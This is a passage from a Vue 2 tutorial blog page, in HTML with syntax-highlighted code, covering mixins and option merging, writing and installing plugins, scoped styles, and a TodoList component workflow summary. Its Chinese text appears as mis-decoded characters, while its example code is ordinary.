class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">address</span>: <span class="hljs-string">&quot;åŒ—äº¬æ˜Œå¹³&quot;</span>,</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title function_">showName</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.demo</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="mixin-æ··å…¥"><a href="#mixin-æ··å…¥" class="headerlink" title="mixin(æ··å…¥)"></a>mixin(æ··å…¥)</h3><p>æ··å…¥ (mixin) æä¾›äº†ä¸€ç§éå¸¸çµæ´»çš„æ–¹å¼ï¼Œæ¥åˆ†å‘ Vueç»„ä»¶ä¸­çš„å¯å¤ç”¨åŠŸèƒ½ã€‚ä¸€ä¸ªæ··å…¥å¯¹è±¡å¯ä»¥åŒ…å«ä»»æ„ç»„ä»¶é€‰é¡¹ã€‚å½“ç»„ä»¶ä½¿ç”¨æ··å…¥å¯¹è±¡æ—¶ï¼Œæ‰€æœ‰æ··å…¥å¯¹è±¡çš„é€‰é¡¹å°†è¢«â€œæ··åˆâ€è¿›å…¥è¯¥ç»„ä»¶æœ¬èº«çš„é€‰é¡¹ã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html">// å®šä¹‰ä¸€ä¸ªæ··å…¥å¯¹è±¡<br>var myMixin = &#123;<br>  created: function () &#123;<br>    this.hello()<br>  &#125;,<br>  methods: &#123;<br>    hello: function () &#123;<br>      console.log(&#x27;hello from mixin!&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br><br>// å®šä¹‰ä¸€ä¸ªä½¿ç”¨æ··å…¥å¯¹è±¡çš„ç»„ä»¶<br>var Component = Vue.extend(&#123;<br>  mixins: [myMixin]<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="é€‰é¡¹åˆå¹¶"><a href="#é€‰é¡¹åˆå¹¶" class="headerlink" title="é€‰é¡¹åˆå¹¶"></a><strong>é€‰é¡¹åˆå¹¶</strong></h3><p>å½“ç»„ä»¶å’Œæ··å…¥å¯¹è±¡å«æœ‰åŒåé€‰é¡¹æ—¶ï¼Œè¿™äº›é€‰é¡¹å°†ä»¥æ°å½“çš„æ–¹å¼è¿›è¡Œâ€œåˆå¹¶â€ã€‚</p><p>æ¯”å¦‚ï¼Œæ•°æ®å¯¹è±¡åœ¨å†…éƒ¨ä¼šè¿›è¡Œé€’å½’åˆå¹¶ï¼Œå¹¶åœ¨å‘ç”Ÿå†²çªæ—¶ä»¥ç»„ä»¶æ•°æ®ä¼˜å…ˆã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">var mixin = &#123;<br>  data: function () &#123;<br>    return &#123;<br>      message: &#x27;hello&#x27;,<br>      foo: &#x27;abc&#x27;<br>    &#125;<br>  &#125;<br>&#125;<br><br>new Vue(&#123;<br>  mixins: [mixin],<br>  data: function () &#123;<br>    return &#123;<br>      message: &#x27;goodbye&#x27;,<br>      bar: &#x27;def&#x27;<br>    &#125;<br>  &#125;,<br>  created: function () &#123;<br>    console.log(this.$data)<br>    // =&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125;<br>  &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>åŒåé’©å­å‡½æ•°å°†åˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå› æ­¤éƒ½å°†è¢«è°ƒç”¨ã€‚å¦å¤–ï¼Œæ··å…¥å¯¹è±¡çš„é’©å­å°†åœ¨ç»„ä»¶è‡ªèº«é’©å­ <strong>ä¹‹å‰</strong> è°ƒç”¨ã€‚</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html">var mixin = &#123;<br>  created: function () &#123;<br>    console.log(&#x27;æ··å…¥å¯¹è±¡çš„é’©å­è¢«è°ƒç”¨&#x27;)<br>  &#125;<br>&#125;<br><br>new Vue(&#123;<br>  mixins: [mixin],<br>  created: function () &#123;<br>    console.log(&#x27;ç»„ä»¶é’©å­è¢«è°ƒç”¨&#x27;)<br>  &#125;<br>&#125;)<br><br>// =&gt; &quot;æ··å…¥å¯¹è±¡çš„é’©å­è¢«è°ƒç”¨&quot;<br>// =&gt; &quot;ç»„ä»¶é’©å­è¢«è°ƒç”¨&quot;<br><br></code></pre></td></tr></table></figure><p>å€¼ä¸ºå¯¹è±¡çš„é€‰é¡¹ï¼Œä¾‹å¦‚ <code>methods</code>ã€<code>components</code> å’Œ<code>directives</code>ï¼Œå°†è¢«åˆå¹¶ä¸ºåŒä¸€ä¸ªå¯¹è±¡ã€‚ä¸¤ä¸ªå¯¹è±¡é”®åå†²çªæ—¶ï¼Œå–ç»„ä»¶å¯¹è±¡çš„é”®å€¼å¯¹ã€‚</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">var mixin = &#123;<br>  methods: &#123;<br>    foo: function () &#123;<br>      console.log(&#x27;foo&#x27;)<br>    &#125;,<br>    conflicting: function () &#123;<br>      console.log(&#x27;from mixin&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br><br>var vm = new Vue(&#123;<br>  mixins: [mixin],<br>  methods: &#123;<br>    bar: function () &#123;<br>      console.log(&#x27;bar&#x27;)<br>    &#125;,<br>    conflicting: function () &#123;<br>      console.log(&#x27;from self&#x27;)<br>    &#125;<br>  &#125;<br>&#125;)<br><br>vm.foo() // =&gt; &quot;foo&quot;<br>vm.bar() // =&gt; &quot;bar&quot;<br>vm.conflicting() // =&gt; &quot;from self&quot;<br><br></code></pre></td></tr></table></figure><blockquote><p>å…¨å±€æ··å…¥ä¸å»ºè®®ä½¿ç”¨</p></blockquote><h3 id="plugin-æ’ä»¶"><a href="#plugin-æ’ä»¶" class="headerlink" title="plugin æ’ä»¶"></a>plugin æ’ä»¶</h3><ol><li>åŠŸèƒ½ï¼šç”¨äºå¢å¼ºVue</li><li>æœ¬è´¨ï¼šåŒ…å«installæ–¹æ³•çš„ä¸€ä¸ªå¯¹è±¡ï¼Œinstallçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Vueï¼Œç¬¬äºŒä¸ªä»¥åçš„å‚æ•°æ˜¯æ’ä»¶ä½¿ç”¨è€…ä¼ é€’çš„æ•°æ®</li><li>å®šä¹‰æ’ä»¶ï¼ˆè§ä¸‹ src&#x2F;plugin.jsï¼‰</li><li>ä½¿ç”¨æ’ä»¶ï¼šVue.use()</li></ol>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">// è°ƒç”¨ `MyPlugin.install(Vue)`<br>Vue.use(MyPlugin)<br><br>new Vue(&#123;<br>  // ...ç»„ä»¶é€‰é¡¹<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>æœ¬è´¨ï¼šåŒ…å«installæ–¹æ³•çš„ä¸€ä¸ªå¯¹è±¡ï¼Œinstallçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Vueï¼Œç¬¬äºŒä¸ªä»¥åçš„å‚æ•°æ˜¯æ’ä»¶ä½¿ç”¨è€…ä¼ é€’çš„æ•°æ®ã€‚</p><p>å®šä¹‰æ’ä»¶ï¼š</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">å¯¹è±¡.install = function (Vue, options) &#123;<br>    // 1. æ·»åŠ å…¨å±€è¿‡æ»¤å™¨<br>    Vue.filter(....)<br><br>    // 2. æ·»åŠ å…¨å±€æŒ‡ä»¤<br>    Vue.directive(....)<br><br>    // 3. é…ç½®å…¨å±€æ··å…¥(åˆ)<br>    Vue.mixin(....)<br><br>    // 4. æ·»åŠ å®ä¾‹æ–¹æ³•<br>    Vue.prototype.$myMethod = function () &#123;...&#125;<br>    Vue.prototype.$myProperty = xxxx<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…·ä½“æ¡ˆä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html">export default &#123;<br>    install(Vue, x, y, z) &#123;<br>        console.log(x, y, z)<br>        //å…¨å±€è¿‡æ»¤å™¨<br>        Vue.filter(&#x27;mySlice&#x27;, function (value) &#123;<br>            return value.slice(0, 4)<br>        &#125;)<br><br>        //å®šä¹‰å…¨å±€æŒ‡ä»¤<br>        Vue.directive(&#x27;fbind&#x27;, &#123;<br>            //æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰<br>            bind(element, binding) &#123;<br>                element.value = binding.value<br>            &#125;,<br>            //æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶<br>            inserted(element, binding) &#123;<br>                element.focus()<br>            &#125;,<br>            //æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶<br>            update(element, binding) &#123;<br>                element.value = binding.value<br>            &#125;<br>        &#125;)<br><br>        //å®šä¹‰æ··å…¥<br>        Vue.mixin(&#123;<br>            data() &#123;<br>                return &#123;<br>                    x: 100,<br>                    y: 200<br>                &#125;<br>            &#125;,<br>        &#125;)<br><br>        //ç»™VueåŸå‹ä¸Šæ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼ˆvmå’Œvcå°±éƒ½èƒ½ç”¨äº†ï¼‰<br>        Vue.prototype.hello = () =&gt; &#123; alert(&#x27;ä½ å¥½å•Šaaaa&#x27;) &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>main.js</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">// å¼•å…¥æ’ä»¶<br>import plugin from &#x27;./plugin&#x27;<br><br>// ä½¿ç”¨æ’ä»¶<br>Vue.use(plugin)<br><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨åˆ«çš„ç»„ä»¶ä½¿ç”¨æ’ä»¶é‡Œçš„åŠŸèƒ½äº†ã€‚</p><h3 id="scopedæ ·å¼"><a href="#scopedæ ·å¼" class="headerlink" title="scopedæ ·å¼"></a>scopedæ ·å¼</h3><pre><code class="hljs">1. ä½œç”¨ï¼šè®©æ ·å¼åœ¨å±€éƒ¨ç”Ÿæ•ˆï¼Œé˜²æ­¢å†²çªã€‚2. å†™æ³•ï¼š`&lt;style scoped&gt;`</code></pre><blockquote><p>Vueä¸­çš„webpackå¹¶æ²¡æœ‰å®‰è£…æœ€æ–°ç‰ˆï¼Œå¯¼è‡´æœ‰äº›æ’ä»¶ä¹Ÿä¸èƒ½é»˜è®¤å®‰è£…æœ€æ–°ç‰ˆï¼Œå¦‚ npm i less-loader@7ï¼Œè€Œä¸æ˜¯æœ€æ–°ç‰ˆ</p></blockquote><p>å…·ä½“æ¡ˆä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css"><span class="hljs-selector-class">.atguigu</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">font-size</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;School&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å°šç¡…è°·atguigu&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;åŒ—äº¬&#x27;</span>,</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;Student.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>å­¦ç”Ÿå§“åï¼š&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;atguigu&quot;</span>&gt;</span>å­¦ç”Ÿæ€§åˆ«ï¼š&#123;&#123; sex &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;ç”·&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.demo</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">    <span class="hljs-selector-class">.atguigu</span> &#123;</span><br><span class="language-css">      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>src&#x2F;App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>ä½ å¥½å•Š<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123; <span class="hljs-title class_">School</span>, <span class="hljs-title class_">Student</span> &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.title</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“TodoListæ¡ˆä¾‹"><a href="#æ€»ç»“TodoListæ¡ˆä¾‹" class="headerlink" title="æ€»ç»“TodoListæ¡ˆä¾‹"></a>æ€»ç»“TodoListæ¡ˆä¾‹</h3><h4 id="ç»„ä»¶åŒ–ç¼–ç æµç¨‹ï¼š"><a href="#ç»„ä»¶åŒ–ç¼–ç æµç¨‹ï¼š" class="headerlink" title="ç»„ä»¶åŒ–ç¼–ç æµç¨‹ï¼š"></a>ç»„ä»¶åŒ–ç¼–ç æµç¨‹ï¼š</h4><ol><li><p>æ‹†åˆ†é™æ€ç»„ä»¶ï¼šç»„ä»¶è¦æŒ‰ç…§åŠŸèƒ½ç‚¹æ‹†åˆ†ï¼Œå‘½åä¸è¦ä¸htmlå…ƒç´ å†²çªã€‚</p></li><li><p>å®ç°åŠ¨æ€ç»„ä»¶ï¼šè€ƒè™‘å¥½æ•°æ®çš„å­˜æ”¾ä½ç½®ï¼Œæ•°æ®æ˜¯ä¸€ä¸ªç»„ä»¶åœ¨ç”¨ï¼Œè¿˜æ˜¯ä¸€äº›ç»„ä»¶åœ¨ç”¨ï¼š</p><ul><li><p>ä¸€ä¸ªç»„ä»¶åœ¨ç”¨ï¼šæ”¾åœ¨ç»„ä»¶è‡ªèº«å³å¯ã€‚</p></li><li><p>ä¸€äº›ç»„ä»¶åœ¨ç”¨ï¼šæ”¾åœ¨ä»–ä»¬å…±åŒçš„çˆ¶ç»„ä»¶ä¸Šï¼ˆçŠ¶æ€æå‡ï¼‰ã€‚</p></li></ul></li><li><p>å®ç°äº¤äº’ï¼šä»ç»‘å®šäº‹ä»¶å¼€å§‹ã€‚</p><ul><li>propsé€‚ç”¨äºï¼š<ul><li>çˆ¶ç»„ä»¶ &#x3D;&#x3D;&gt; å­ç»„ä»¶ é€šä¿¡</li><li>å­ç»„ä»¶ &#x3D;&#x3D;&gt; çˆ¶ç»„ä»¶ é€šä¿¡ï¼ˆè¦æ±‚çˆ¶å…ˆç»™å­ä¸€ä¸ªå‡½æ•°ï¼‰</li></ul></li></ul></li><li><p>ä½¿ç”¨v-modelæ—¶è¦åˆ‡è®°ï¼šv-modelç»‘å®šçš„å€¼ä¸èƒ½æ˜¯propsä¼ è¿‡æ¥çš„å€¼ï¼Œå› ä¸ºpropsæ˜¯ä¸å¯ä»¥ä¿®æ”¹çš„ï¼</p></li><li><p>propsä¼ è¿‡æ¥çš„è‹¥æ˜¯å¯¹è±¡ç±»å‹çš„å€¼ï¼Œä¿®æ”¹å¯¹è±¡ä¸­çš„å±æ€§æ—¶Vueä¸ä¼šæŠ¥é”™ï¼Œä½†ä¸æ¨èè¿™æ ·åšã€‚</p></li></ol><p>src&#x2F;App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 